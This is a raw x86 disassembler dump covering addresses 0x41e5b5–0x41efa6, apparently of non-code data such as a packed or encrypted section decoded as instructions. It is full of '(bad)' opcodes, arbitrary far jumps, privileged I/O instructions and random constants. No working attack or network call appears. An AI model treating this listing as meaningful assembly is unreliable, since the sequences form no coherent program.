  41e5b5:	and    BYTE PTR [ebx],dl
  41e5b7:	mov    bl,0x4b
  41e5b9:	sbb    al,ch
  41e5bb:	lods   eax,DWORD PTR ds:[esi]
  41e5bc:	add    BYTE PTR [edx],ah
  41e5be:	(bad)  
  41e5bf:	jmp    0x4146:0x4867b52f
  41e5c6:	mov    esp,0x1ae73c18
  41e5cb:	aaa    
  41e5cc:	ret    0xe5a1
  41e5cf:	gs sti 
  41e5d1:	sub    al,0xa
  41e5d3:	imul   edi,DWORD PTR [ecx-0x2],0xd46bbb65
  41e5da:	stc    
  41e5db:	in     al,dx
  41e5dc:	aaa    
  41e5dd:	mov    edx,0xdd5c7d65
  41e5e2:	sbb    BYTE PTR [edi+0x2c],0x1
  41e5e6:	rcr    BYTE PTR [esi-0x41126021],cl
  41e5ec:	mov    eax,ss
  41e5ee:	mov    DWORD PTR [esi+0x55],esp
  41e5f1:	or     esp,DWORD PTR [ecx]
  41e5f3:	into   
  41e5f4:	push   es
  41e5f5:	xlat   BYTE PTR ds:[ebx]
  41e5f6:	add    dh,0x5b
  41e5f9:	mov    dh,0x8e
  41e5fb:	xchg   ebx,eax
  41e5fc:	popa   
  41e5fd:	(bad)  
  41e5fe:	ficom  DWORD PTR [ecx]
  41e600:	or     BYTE PTR [eax],0x1d
  41e603:	add    eax,DWORD PTR [edx+ebp*8]
  41e606:	pop    eax
  41e607:	add    BYTE PTR [eax+eiz*2-0x33935333],al
  41e60e:	std    
  41e60f:	jb     0x41e68f
  41e611:	fst    QWORD PTR [ebx+eiz*1-0x10]
  41e615:	lea    eax,[esi+0x26]
  41e618:	(bad)  
  41e61b:	fld    QWORD PTR [ecx-0x80]
  41e61e:	jl     0x41e5d3
  41e620:	ins    BYTE PTR es:[edi],dx
  41e621:	mov    edi,0x5d8c7741
  41e626:	xchg   cl,dh
  41e628:	sbb    cl,cl
  41e62a:	dec    edx
  41e62b:	shl    DWORD PTR [edx],0x17
  41e62e:	adc    al,ah
  41e630:	pop    ds
  41e631:	dec    esi
  41e632:	cdq    
  41e633:	cld    
  41e634:	lea    eax,[eax]
	...
  41e696:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e69c:	cmc    
  41e69d:	cwde   
  41e69e:	xchg   edx,eax
  41e69f:	fmul   st(5),st
  41e6a1:	mov    ds:0x372dbf99,al
  41e6a6:	std    
  41e6a7:	inc    ecx
  41e6a8:	add    DWORD PTR [eax],eax
  41e6aa:	pop    es
  41e6ab:	add    DWORD PTR [eax],eax
  41e6ad:	add    BYTE PTR [edi],bh
  41e6af:	sbb    BYTE PTR [edx+0x2455a29a],0x83
  41e6b6:	sbb    DWORD PTR [edx-0x15],edx
  41e6b9:	pop    esi
  41e6ba:	call   0x2f31:0xbf5c9f3f
  41e6c1:	xor    al,bh
  41e6c3:	shl    DWORD PTR [ebp+0x7f],0x8
  41e6c7:	les    edx,FWORD PTR [ebx-0x6536a95a]
  41e6cd:	jge    0x41e70f
  41e6cf:	in     al,dx
  41e6d0:	lods   al,BYTE PTR ds:[esi]
  41e6d1:	and    DWORD PTR [eax],esp
  41e6d3:	aad    0x4e
  41e6d5:	ja     0x41e6c9
  41e6d7:	js     0x41e6ad
  41e6d9:	fwait
  41e6da:	cmp    eax,0x5ea78a4f
  41e6df:	inc    esi
  41e6e0:	mov    ss,WORD PTR [ebp+0x6fdc3d37]
  41e6e6:	fsubp  st(3),st
  41e6e8:	in     eax,0xa
  41e6ea:	aas    
  41e6eb:	sub    DWORD PTR [eax+0x1d],esi
  41e6ee:	mov    ebp,0x6f0864a3
  41e6f3:	hlt    
  41e6f4:	mov    al,0xa2
  41e6f6:	mov    dh,0x52
  41e6f8:	jg     0x41e703
  41e6fa:	mov    bh,0xc4
  41e6fc:	pop    esp
  41e6fd:	bound  ecx,QWORD PTR [eax-0x54843bd7]
  41e703:	in     eax,0x1b
  41e705:	int    0xe2
  41e707:	in     al,dx
  41e708:	sub    al,0x60
  41e70a:	(bad)  
  41e70b:	mov    bh,0x3b
  41e70d:	jbe    0x41e69b
  41e70f:	aas    
  41e710:	enter  0xa388,0x9b
  41e714:	xor    DWORD PTR [edx],edx
  41e716:	fmul   DWORD PTR [esp+ecx*2+0x6d44a1f0]
  41e71d:	pop    esi
  41e71e:	cli    
  41e71f:	nop
  41e720:	test   dh,0xe
  41e723:	mov    cl,0x62
  41e725:	mov    edi,0x8799f69b
  41e72a:	scas   eax,DWORD PTR es:[edi]
  41e72b:	repz sub al,0x72
  41e72e:	imul   BYTE PTR [eax+0x26fa327d]
  41e734:	inc    edi
  41e735:	popa   
  41e736:	push   edi
  41e737:	or     cl,ah
  41e739:	jne    0x41e6e8
  41e73b:	jp     0x41e75c
  41e73d:	fcmovne st,st(4)
  41e73f:	cld    
  41e740:	fs push edx
  41e742:	sub    al,0xdf
  41e744:	inc    esi
  41e745:	add    al,0xe4
  41e747:	hlt    
  41e748:	daa    
  41e749:	icebp  
  41e74a:	and    al,0x65
  41e74c:	adc    eax,0xd3768ef
  41e751:	gs inc edx
  41e753:	add    DWORD PTR [esi-0x6670c21c],0xffffffcf
  41e75a:	leave  
  41e75b:	jo     0x41e6eb
  41e75d:	fstp   TBYTE PTR [esi]
  41e75f:	sbb    al,0xa4
  41e761:	pop    edx
  41e762:	inc    edx
  41e763:	inc    edx
  41e764:	lea    ebp,[ecx+0x75aaab78]
  41e76a:	cdq    
  41e76b:	pop    ds
  41e76c:	loop   0x41e6ee
  41e76e:	mov    edx,0xec1067bb
  41e773:	push   ecx
  41e774:	jb     0x41e707
  41e776:	dec    esi
  41e777:	popa   
  41e778:	scas   al,BYTE PTR es:[edi]
  41e779:	lds    ebx,FWORD PTR [edx-0x63d3bbcb]
  41e77f:	mov    bl,dl
  41e781:	or     BYTE PTR [esi+eax*4],dl
  41e784:	pop    edx
  41e785:	jle    0x41e708
  41e787:	xchg   esp,eax
  41e788:	jo     0x41e77b
  41e78a:	push   ecx
  41e78b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e78c:	mov    edi,0x58f61278
  41e791:	outs   dx,BYTE PTR ds:[esi]
  41e792:	pop    esi
  41e793:	and    DWORD PTR [ecx+0x1b],edx
  41e796:	or     eax,0xe770ce20
  41e79b:	loope  0x41e79e
  41e79d:	imul   ecx,DWORD PTR [eax+0x6],0x3d
  41e7a1:	jno    0x41e7a9
  41e7a3:	xchg   esi,eax
  41e7a4:	fistp  DWORD PTR [esi]
  41e7a6:	(bad)  ds:0x761a3c93
  41e7ac:	iret   
  41e7ad:	pop    ecx
  41e7ae:	adc    DWORD PTR ss:[edx+edi*4+0xb09c2],ebp
	...
  41e816:	sub    eax,0x9e5c8a39
  41e81b:	(bad)  
  41e81c:	(bad)  
  41e81d:	jns    0x41e875
  41e81f:	imul   ebx,DWORD PTR [esi+eiz*2],0xffffffc4
  41e823:	pop    edx
  41e824:	js     0x41e83a
  41e826:	add    al,0x43
  41e828:	add    DWORD PTR [eax],eax
  41e82a:	pop    es
  41e82b:	add    DWORD PTR [eax],eax
  41e82d:	add    BYTE PTR [eax+0x31],dh
  41e830:	popf   
  41e831:	xor    al,0x99
  41e833:	dec    esi
  41e834:	inc    edx
  41e835:	mov    DWORD PTR [ecx-0x35],ebx
  41e838:	inc    ecx
  41e839:	xchg   di,ax
  41e83b:	mov    DWORD PTR [edi],ebx
  41e83d:	cmp    ch,BYTE PTR [ebx]
  41e83f:	das    
  41e840:	test   DWORD PTR [ecx-0x6b878520],eax
  41e846:	jne    0x41e803
  41e848:	pop    es
  41e849:	jno    0x41e87e
  41e84b:	daa    
  41e84c:	(bad)  
  41e84e:	xor    BYTE PTR ds:0xb03ba4a6,bl
  41e854:	pusha  
  41e855:	and    ebx,DWORD PTR [eax+0x77]
  41e858:	jo     0x41e85a
  41e85a:	lds    eax,FWORD PTR [ecx+0x66]
  41e85d:	int3   
  41e85e:	call   0x8cebdf79
  41e863:	or     al,0xf0
  41e865:	in     al,0x88
  41e867:	sub    DWORD PTR [edx-0x1104c408],eax
  41e86d:	sub    ch,BYTE PTR [ecx+0x2655f5cc]
  41e873:	inc    ebp
  41e874:	push   esp
  41e875:	sub    edx,edx
  41e877:	fisubr DWORD PTR ds:0x92404714
  41e87d:	cwde   
  41e87e:	test   BYTE PTR [eax],bl
  41e880:	aam    0xbf
  41e882:	jne    0x41e833
  41e884:	sub    ebp,DWORD PTR [ebp-0x2d84404e]
  41e88a:	cmp    ecx,DWORD PTR [ebp-0x4feaedbf]
  41e890:	scas   eax,DWORD PTR es:[edi]
  41e891:	mov    ds:0x7378d4c0,al
  41e896:	push   ebx
  41e897:	test   ebp,ebp
  41e899:	sahf   
  41e89a:	ror    DWORD PTR [edx+edi*8],cl
  41e89d:	xor    eax,0x5d93b80c
  41e8a2:	push   eax
  41e8a3:	jecxz  0x41e82a
  41e8a5:	push   ecx
  41e8a6:	mov    ds:0xc4b0134b,eax
  41e8ab:	sbb    DWORD PTR [esi+edx*8],edi
  41e8ae:	aas    
  41e8af:	ret    0xa97b
  41e8b2:	sbb    eax,DWORD PTR [ecx-0x32]
  41e8b5:	jge    0x41e8e2
  41e8b7:	je     0x41e8a0
  41e8b9:	scas   al,BYTE PTR es:[edi]
  41e8ba:	mov    bh,0xc7
  41e8bc:	sub    al,0xae
  41e8be:	outs   dx,BYTE PTR cs:[esi]
  41e8c0:	cmp    al,0xf5
  41e8c2:	aam    0xe9
  41e8c4:	rcr    edx,1
  41e8c6:	aam    0x27
  41e8c8:	into   
  41e8c9:	mov    dl,0x86
  41e8cb:	mov    ch,0x8
  41e8cd:	inc    esi
  41e8ce:	cdq    
  41e8cf:	jbe    0x41e8cd
  41e8d1:	push   esp
  41e8d2:	pop    ecx
  41e8d3:	add    ch,ch
  41e8d5:	adc    eax,DWORD PTR [esi+0x189b9bbb]
  41e8db:	es push 0xcad35251
  41e8e1:	je     0x41e8c9
  41e8e3:	out    dx,eax
  41e8e4:	and    DWORD PTR [ebx],edx
  41e8e6:	jmp    0x4bce59fc
  41e8eb:	out    0x7d,al
  41e8ed:	dec    ecx
  41e8ee:	jo     0x41e8a7
  41e8f0:	icebp  
  41e8f1:	push   0x40
  41e8f3:	ins    DWORD PTR es:[edi],dx
  41e8f4:	inc    edx
  41e8f5:	rcl    esi,cl
  41e8f7:	adc    eax,0xf21e84d2
  41e8fc:	rcr    BYTE PTR [edi-0x3c],cl
  41e8ff:	adc    edi,DWORD PTR ds:0x9fea8c44
  41e905:	xor    eax,0xfcc303c2
  41e90a:	add    esi,DWORD PTR [ebx-0x39]
  41e90d:	jle    0x41e947
  41e90f:	lock or eax,0x433a51b0
  41e915:	xor    BYTE PTR [ebp+0x61],dl
  41e918:	mov    edi,0x5f05b1ac
  41e91d:	add    dh,BYTE PTR [eax-0x63215a0b]
  41e923:	es jp  0x41e941
  41e926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e927:	ins    DWORD PTR es:[edi],dx
  41e928:	xor    esp,DWORD PTR [esi+0x7a]
  41e92b:	pop    edx
  41e92c:	add    BYTE PTR [ecx+0x6799c644],dh
  41e932:	pop    ebp
  41e933:	das    
  41e934:	cwde   
	...
  41e995:	add    BYTE PTR [eax-0x3],bh
  41e998:	ret    0xc766
  41e99b:	jg     0x41e999
  41e99d:	(bad)  
  41e99e:	jmp    0x41e94c
  41e9a0:	repnz xchg ecx,eax
  41e9a2:	aam    0x1
  41e9a4:	lea    ebx,[edx+0x1440b]
  41e9aa:	pop    es
  41e9ab:	add    DWORD PTR [eax],eax
  41e9ad:	add    BYTE PTR [eax+0xb22a693],dl
  41e9b3:	ror    BYTE PTR [eax-0x5da802a1],1
  41e9b9:	pop    esp
  41e9ba:	push   ds
  41e9bb:	jmp    DWORD PTR [eax]
  41e9bd:	jp     0x41e9a1
  41e9bf:	pop    ecx
  41e9c0:	into   
  41e9c1:	xchg   ebp,eax
  41e9c2:	mov    esp,0xf447be89
  41e9c7:	je     0x41e9a8
  41e9c9:	test   esi,esi
  41e9cb:	push   es
  41e9cc:	shl    BYTE PTR [esi+0x13ace8de],0x40
  41e9d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9d4:	icebp  
  41e9d5:	add    BYTE PTR [edi+0xb],0x27
  41e9d9:	jb     0x41ea58
  41e9db:	mov    edi,0x531a2133
  41e9e0:	xchg   ecx,eax
  41e9e1:	or     DWORD PTR [edi-0x27431039],ebx
  41e9e7:	imul   ebp,DWORD PTR [ecx-0x8beeb42],0x63524b2f
  41e9f1:	inc    ebx
  41e9f2:	(bad)  
  41e9f3:	bound  ecx,QWORD PTR [edx+ebp*4-0x5e]
  41e9f7:	iret   
  41e9f8:	mov    ah,0x91
  41e9fa:	in     al,0x3f
  41e9fc:	ret    0x5e18
  41e9ff:	adc    DWORD PTR [edi+edx*2],eax
  41ea02:	test   eax,0x13a429b8
  41ea07:	xchg   edi,eax
  41ea08:	pushf  
  41ea09:	fadd   DWORD PTR [edi]
  41ea0b:	ja     0x41e992
  41ea0d:	call   0xc2c0:0xcf263936
  41ea14:	lods   eax,DWORD PTR ds:[esi]
  41ea15:	test   eax,0xd7733dd6
  41ea1a:	xor    DWORD PTR [ebp*1-0x7f1c3e89],0xffffffc6
  41ea22:	out    dx,al
  41ea23:	nop
  41ea24:	(bad)  
  41ea25:	out    0xce,al
  41ea27:	cmp    DWORD PTR [edi-0x40198fba],eax
  41ea2d:	loope  0x41ea0d
  41ea2f:	xchg   edi,eax
  41ea30:	out    0x82,al
  41ea32:	or     dh,BYTE PTR [ebx]
  41ea34:	ret    0x9aec
  41ea37:	mov    dh,0x5
  41ea39:	push   edx
  41ea3a:	inc    eax
  41ea3b:	dec    ebx
  41ea3c:	fnstsw WORD PTR [ebx-0x23e3cc4]
  41ea42:	repnz sar ch,0xdc
  41ea46:	out    dx,al
  41ea47:	ss dec ebp
  41ea49:	rol    DWORD PTR [ebp-0x644b1d4c],1
  41ea4f:	mov    eax,0xa80d546c
  41ea54:	scas   al,BYTE PTR es:[edi]
  41ea55:	add    al,0x6e
  41ea57:	test   DWORD PTR [edx-0x6f],edx
  41ea5a:	loope  0x41ea69
  41ea5c:	fnstcw WORD PTR [edx+0x11]
  41ea5f:	mov    BYTE PTR [ebx+eiz*8-0x17],dl
  41ea63:	stc    
  41ea64:	out    0x8c,al
  41ea66:	in     eax,dx
  41ea67:	daa    
  41ea68:	jae    0x41ea82
  41ea6a:	jl     0x41ea9c
  41ea6c:	cmp    DWORD PTR [eax-0x67],ebx
  41ea6f:	repnz rcr BYTE PTR [ecx],0x89
  41ea73:	xor    esi,DWORD PTR [ebx+0x302eb7ee]
  41ea79:	lds    eax,FWORD PTR [ebp+0x2c]
  41ea7c:	inc    edi
  41ea7d:	call   0x64d5e7e3
  41ea82:	ins    DWORD PTR es:[edi],dx
  41ea83:	xchg   ecx,eax
  41ea84:	(bad)  
  41ea85:	fcom   DWORD PTR [eax+0x34]
  41ea88:	fld    TBYTE PTR [ebp+0x630417fc]
  41ea8e:	es mov edi,0x4b437270
  41ea94:	jo     0x41ea4e
  41ea96:	pushf  
  41ea97:	and    bl,ch
  41ea99:	xchg   DWORD PTR [edx-0x6386bb8f],ebx
  41ea9f:	shl    BYTE PTR [eax+0x53],0x94
  41eaa3:	mov    ch,0xea
  41eaa5:	sub    eax,ebp
  41eaa7:	jp     0x41ea80
  41eaa9:	bound  ebx,QWORD PTR [edi-0x63]
  41eaac:	mov    DWORD PTR [esi-0xd],ebx
  41eaaf:	xlat   BYTE PTR ds:[ebx]
  41eab0:	sbb    DWORD PTR [esp+eax*2-0x29],esi
  41eab4:	mov    ecx,0x0
	...
  41eb15:	add    BYTE PTR [edx],dl
  41eb17:	das    
  41eb18:	mov    esi,DWORD PTR [edi+edi*4+0x22af3fb4]
  41eb1f:	and    ebp,DWORD PTR [eax]
  41eb21:	fldpi  
  41eb23:	add    DWORD PTR [esi+0xf],0x14512
  41eb2a:	pop    es
  41eb2b:	add    DWORD PTR [eax],eax
  41eb2d:	add    BYTE PTR [ebp-0x73],al
  41eb30:	sub    esi,DWORD PTR [edi]
  41eb32:	mov    ds:0x68f947df,al
  41eb37:	or     ecx,DWORD PTR [edx+0x36ac63aa]
  41eb3d:	out    0x2c,eax
  41eb3f:	inc    ebp
  41eb40:	inc    eax
  41eb41:	xor    BYTE PTR [ecx],bl
  41eb43:	ror    BYTE PTR [edx-0x23],0xbf
  41eb47:	mov    edi,0x3f928f11
  41eb4c:	cmp    BYTE PTR [esi-0x3bff8e49],ch
  41eb52:	dec    ebp
  41eb53:	fdiv   DWORD PTR [ecx+0xc12553d]
  41eb59:	add    BYTE PTR [edi],dh
  41eb5b:	in     al,dx
  41eb5c:	idiv   dl
  41eb5e:	mov    eax,0xdd4865a5
  41eb63:	in     al,dx
  41eb64:	xor    al,0x20
  41eb66:	or     ebp,edx
  41eb68:	xor    ecx,DWORD PTR [ecx+0x36]
  41eb6b:	ror    DWORD PTR [edi],cl
  41eb6d:	ss cmp ebp,0x5f40deac
  41eb74:	or     ch,ah
  41eb76:	cmp    DWORD PTR [ebp+0x68],0x13
  41eb7a:	sub    DWORD PTR [ebx-0x42],esp
  41eb7d:	inc    ebx
  41eb7e:	jmp    0x41eb1a
  41eb80:	mov    esp,0xe2433efa
  41eb85:	cmp    bl,0xd1
  41eb88:	xor    DWORD PTR [edi],eax
  41eb8a:	sub    eax,DWORD PTR [edx+0x2a]
  41eb8d:	loope  0x41eba5
  41eb8f:	adc    al,0x69
  41eb91:	fidivr WORD PTR [edx-0x74e9b33a]
  41eb97:	out    0x2,al
  41eb99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb9a:	mov    esi,0x8fa4613d
  41eb9f:	(bad)  
  41eba0:	sub    eax,0x1fff9770
  41eba5:	adc    edi,DWORD PTR [eax-0x70]
  41eba8:	ja     0x41ec0b
  41ebaa:	mov    ds:0x155aca9c,al
  41ebaf:	mov    es,esp
  41ebb1:	lods   al,BYTE PTR ds:[esi]
  41ebb2:	sahf   
  41ebb3:	cdq    
  41ebb4:	in     al,0xbc
  41ebb6:	jns    0x41eb91
  41ebb8:	popa   
  41ebb9:	push   0x682c1b20
  41ebbe:	mov    esi,0x5657336
  41ebc3:	(bad)  
  41ebc4:	fwait
  41ebc5:	add    ebx,DWORD PTR [ecx+0x7b6d28e2]
  41ebcb:	repnz mov eax,0x3e17c6fc
  41ebd1:	mov    esi,0x65320316
  41ebd6:	mov    ch,0xbc
  41ebd8:	mov    edi,0xcf1c89c4
  41ebdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebde:	xor    BYTE PTR [edx+ebp*2+0x4a692407],ch
  41ebe5:	pop    ecx
  41ebe6:	push   ss
  41ebe7:	lds    esp,FWORD PTR [ebx]
  41ebe9:	into   
  41ebea:	xchg   esi,eax
  41ebeb:	std    
  41ebec:	ror    DWORD PTR [edx+0x3bd5b292],cl
  41ebf2:	adc    DWORD PTR [eax*1+0x7702997],esp
  41ebf9:	jp     0x41ec20
  41ebfb:	jbe    0x41ebb6
  41ebfd:	jg     0x41ebaf
  41ebff:	xlat   BYTE PTR ds:[ebx]
  41ec00:	inc    edx
  41ec01:	xchg   esp,eax
  41ec02:	scas   eax,DWORD PTR es:[edi]
  41ec03:	aad    0xa7
  41ec05:	das    
  41ec06:	pop    ebx
  41ec07:	hlt    
  41ec08:	lock or al,0x41
  41ec0b:	inc    eax
  41ec0c:	sahf   
  41ec0d:	les    ebp,FWORD PTR [edx+0x3080fec7]
  41ec13:	addr16 pusha 
  41ec15:	sti    
  41ec16:	outs   dx,BYTE PTR ds:[esi]
  41ec17:	ins    DWORD PTR es:[edi],dx
  41ec18:	push   es
  41ec19:	pop    ebx
  41ec1a:	and    eax,0x863ffb8c
  41ec1f:	jmp    0x80cb:0x698fa87c
  41ec26:	push   ss
  41ec27:	retf   0xbbfb
  41ec2a:	and    ebx,DWORD PTR [edx-0x7f]
  41ec2d:	jae    0x41ecab
  41ec2f:	mov    ebp,0x8480a819
  41ec34:	push   ds
	...
  41ec95:	add    BYTE PTR [ecx-0xf],al
  41ec98:	(bad)
  41ec9b:	hlt    
  41ec9c:	gs icebp 
  41ec9e:	adc    ebx,edi
  41eca0:	ficom  WORD PTR [ecx]
  41eca2:	push   0x19917090
  41eca7:	inc    esi
  41eca8:	add    DWORD PTR [eax],eax
  41ecaa:	pop    es
  41ecab:	add    DWORD PTR [eax],eax
  41ecad:	add    BYTE PTR [eax],dl
  41ecaf:	mov    cl,0xed
  41ecb1:	lds    esp,FWORD PTR [esi+0x59]
  41ecb4:	out    dx,eax
  41ecb5:	xchg   edx,ebx
  41ecb7:	jg     0x41ed0c
  41ecb9:	aam    0x4
  41ecbb:	sbb    DWORD PTR [ecx-0x74],ecx
  41ecbe:	loop   0x41ecf0
  41ecc0:	dec    edx
  41ecc1:	sti    
  41ecc2:	call   0xf02a6357
  41ecc7:	sbb    ah,BYTE PTR [ebx]
  41ecc9:	push   0xc
  41eccb:	dec    ebp
  41eccc:	in     al,0x69
  41ecce:	in     eax,0xa7
  41ecd0:	push   ebp
  41ecd1:	clc    
  41ecd2:	(bad)  
  41ecd3:	dec    ebx
  41ecd4:	xchg   edx,eax
  41ecd5:	cs mov ch,0xd2
  41ecd8:	and    bh,cl
  41ecda:	and    al,0xee
  41ecdc:	scas   eax,DWORD PTR es:[edi]
  41ecdd:	cwde   
  41ecde:	dec    ebx
  41ecdf:	mov    ebp,0x55c61098
  41ece4:	or     BYTE PTR [edi+0x49],bl
  41ece7:	jle    0x41ed13
  41ece9:	sub    eax,0x6d0c0057
  41ecee:	xchg   ch,dl
  41ecf0:	pop    edx
  41ecf1:	ror    BYTE PTR [edx],cl
  41ecf3:	stos   DWORD PTR es:[edi],eax
  41ecf4:	stc    
  41ecf5:	mov    bh,0x55
  41ecf7:	rol    BYTE PTR [ecx+0x35],0x3a
  41ecfb:	mov    dh,0xa2
  41ecfd:	pop    es
  41ecfe:	mov    bl,0x65
  41ed00:	pop    ebx
  41ed01:	cwde   
  41ed02:	lods   eax,DWORD PTR ds:[esi]
  41ed03:	mov    ebp,0xaf571468
  41ed08:	inc    eax
  41ed09:	int3   
  41ed0a:	jecxz  0x41ed52
  41ed0c:	push   0xffffffea
  41ed0e:	xor    BYTE PTR [ecx+0x4],ah
  41ed11:	neg    DWORD PTR [ebp+0x476d21f0]
  41ed17:	xchg   ebp,eax
  41ed18:	or     eax,0x3d392ec
  41ed1d:	or     BYTE PTR [ecx+0x37],dl
  41ed20:	mov    bl,0x0
  41ed22:	mov    esi,0x56122555
  41ed27:	xchg   esi,eax
  41ed28:	lahf   
  41ed29:	jo     0x41ed0d
  41ed2b:	xchg   edx,eax
  41ed2c:	xor    edx,DWORD PTR [ebx+0x24]
  41ed2f:	push   ecx
  41ed30:	aam    0x11
  41ed32:	push   edi
  41ed33:	sahf   
  41ed34:	test   BYTE PTR [edi-0x79],dh
  41ed37:	xchg   ecx,eax
  41ed38:	mov    eax,0x66cfb8ff
  41ed3d:	fxch   st(0)
  41ed3f:	or     al,0x24
  41ed41:	out    dx,eax
  41ed42:	test   edx,edi
  41ed44:	in     al,0x91
  41ed46:	jg     0x41eccf
  41ed48:	jge    0x41edc7
  41ed4a:	shl    al,1
  41ed4c:	push   esp
  41ed4d:	lahf   
  41ed4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed4f:	mov    esp,0x5cf52c2a
  41ed54:	mov    esi,0x109fd718
  41ed59:	xor    eax,0x13dae679
  41ed5e:	dec    esp
  41ed5f:	fild   QWORD PTR [ebx-0x736601a2]
  41ed65:	ds jno 0x41ed7e
  41ed68:	jmp    0x41ed6a
  41ed6a:	std    
  41ed6b:	mov    edx,0xa8f57019
  41ed70:	sub    al,0xe9
  41ed72:	mov    ds:0xdab5cbec,eax
  41ed77:	call   DWORD PTR [esi]
  41ed79:	add    eax,edi
  41ed7b:	icebp  
  41ed7c:	xchg   edx,eax
  41ed7d:	jb     0x41ed6c
  41ed7f:	int3   
  41ed80:	pop    ds
  41ed81:	xchg   esp,eax
  41ed82:	xor    cl,BYTE PTR ds:0x7baa8f
  41ed88:	fiadd  DWORD PTR [ecx+0x11]
  41ed8b:	lock iret 
  41ed8d:	(bad)  
  41ed8e:	fsubr  DWORD PTR [edx]
  41ed90:	push   eax
  41ed91:	push   es
  41ed92:	push   ecx
  41ed93:	sbb    DWORD PTR [edx],esi
  41ed95:	pop    esp
  41ed96:	sbb    BYTE PTR [ebx-0x4a],dh
  41ed99:	fstp   TBYTE PTR [edi-0x40e2e4e9]
  41ed9f:	jle    0x41ed74
  41eda1:	fdiv   QWORD PTR [edx-0xe18b7d4]
  41eda8:	fstp   QWORD PTR [ecx+0x0]
  41edab:	inc    ebp
  41edac:	repz sbb BYTE PTR [eax-0x1d],bh
  41edb0:	(bad)  
  41edb1:	pop    ecx
  41edb2:	jecxz  0x41ede9
  41edb4:	jns    0x41edb6
	...
  41ee16:	add    eax,0x7b197956
  41ee1b:	aas    
  41ee1c:	gs pop esi
  41ee1e:	mov    ds:0x8b75b0a2,al
  41ee23:	or     BYTE PTR [ecx],0x32
  41ee26:	and    BYTE PTR [edi+0x1],al
  41ee29:	add    BYTE PTR [edi],al
  41ee2b:	add    DWORD PTR [eax],eax
  41ee2d:	add    BYTE PTR [ecx+0x2a58d6],bh
  41ee33:	fsubr  DWORD PTR [edi]
  41ee35:	mov    eax,ds:0xb85f6ad3
  41ee3a:	add    eax,0x5e9c4a60
  41ee3f:	and    esp,DWORD PTR [ebx]
  41ee41:	scas   al,BYTE PTR es:[edi]
  41ee42:	jo     0x41eeb0
  41ee44:	arpl   di,bp
  41ee46:	js     0x41edcb
  41ee48:	js     0x41ee5b
  41ee4a:	adc    al,0xe1
  41ee4c:	scas   eax,DWORD PTR es:[edi]
  41ee4d:	repnz aaa 
  41ee4f:	mov    dl,0xe6
  41ee51:	xor    al,0xfc
  41ee53:	mov    ah,0xdb
  41ee55:	xchg   esp,eax
  41ee56:	pop    edi
  41ee57:	(bad)  
  41ee58:	repz loope 0x41eeaa
  41ee5b:	xchg   edx,eax
  41ee5c:	test   BYTE PTR [edx-0x633c2070],al
  41ee62:	ds adc eax,0xefc11761
  41ee68:	sbb    edi,ebx
  41ee6a:	shl    DWORD PTR [ecx],1
  41ee6c:	out    dx,eax
  41ee6d:	int    0x59
  41ee6f:	jo     0x41edf9
  41ee71:	mov    WORD PTR [edx-0x63],es
  41ee74:	popf   
  41ee75:	xor    eax,0xacfd654e
  41ee7a:	jl     0x41ee0f
  41ee7c:	scas   eax,DWORD PTR es:[edi]
  41ee7d:	mov    al,ds:0x5841cd73
  41ee82:	adc    al,0xd
  41ee84:	popf   
  41ee85:	cmp    DWORD PTR [esi-0x2d334af8],0x94d1e3be
  41ee8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee90:	jecxz  0x41ee21
  41ee92:	dec    ebx
  41ee93:	and    eax,0x9bef4ef9
  41ee98:	add    al,0xba
  41ee9a:	enter  0x4037,0x1a
  41ee9e:	fcom   DWORD PTR [ebp+0x17]
  41eea1:	fdiv   DWORD PTR [edi]
  41eea3:	push   ebp
  41eea4:	arpl   WORD PTR [ecx+0x1b],bx
  41eea7:	adc    DWORD PTR [ebx+0x4b],esp
  41eeaa:	aam    0x29
  41eeac:	jb     0x41ef09
  41eeae:	jmp    0x7f54:0x73f7df53
  41eeb5:	ins    BYTE PTR es:[edi],dx
  41eeb6:	push   cs
  41eeb7:	adc    al,0xad
  41eeb9:	pop    edx
  41eeba:	ror    BYTE PTR [ebx-0x5b],0x42
  41eebe:	push   ebx
  41eebf:	nop
  41eec0:	pop    ecx
  41eec1:	les    eax,FWORD PTR [esi-0x305f1d37]
  41eec7:	inc    esi
  41eec8:	mov    cl,0x82
  41eeca:	imul   esi
  41eecc:	cmc    
  41eecd:	sub    BYTE PTR [esi+0x42],0x2d
  41eed1:	sub    BYTE PTR [esi],bh
  41eed3:	or     DWORD PTR [ecx+0x22b003c],eax
  41eed9:	stos   BYTE PTR es:[edi],al
  41eeda:	scas   al,BYTE PTR es:[edi]
  41eedb:	les    eax,FWORD PTR [ebx-0x65]
  41eede:	(bad)  
  41eee0:	jb     0x41ee63
  41eee2:	inc    bx
  41eee4:	fsubr  st(5),st
  41eee6:	mov    BYTE PTR [eax-0x3f],dh
  41eee9:	in     al,dx
  41eeea:	(bad)  
  41eeeb:	cli    
  41eeec:	mov    bh,dh
  41eeee:	mov    WORD PTR [edx],cs
  41eef0:	shr    DWORD PTR [ecx],0x58
  41eef3:	mov    al,ds:0x62170ec7
  41eef8:	dec    esi
  41eef9:	in     eax,0xc8
  41eefb:	mov    eax,0x3739d2a2
  41ef00:	inc    ecx
  41ef01:	retf   0x3f
  41ef04:	sub    al,0x7f
  41ef06:	add    BYTE PTR [edi+0x55bc0b25],al
  41ef0c:	loope  0x41ef3b
  41ef0e:	ja     0x41ef3d
  41ef10:	and    al,0x8d
  41ef12:	(bad)  
  41ef13:	or     DWORD PTR [edi+0x58105180],esi
  41ef19:	call   0xa6e1:0xa07cd9fc
  41ef20:	jecxz  0x41ef49
  41ef22:	fadd   QWORD PTR [esi-0x10]
  41ef25:	push   edx
  41ef26:	sub    BYTE PTR [ebx],bh
  41ef28:	inc    ebx
  41ef29:	fs (bad) 
  41ef2b:	jb     0x41ef9c
  41ef2d:	mov    ah,0x79
  41ef2f:	int    0xa0
  41ef31:	test   eax,0xf4bd98
	...
  41ef96:	mov    ecx,0xff25bf5d
  41ef9b:	out    0xbb,eax
  41ef9d:	fnstsw WORD PTR [eax-0x530314c8]
  41efa3:	mov    esp,DWORD PTR [ebx+0x47]
  41efa6:	daa    
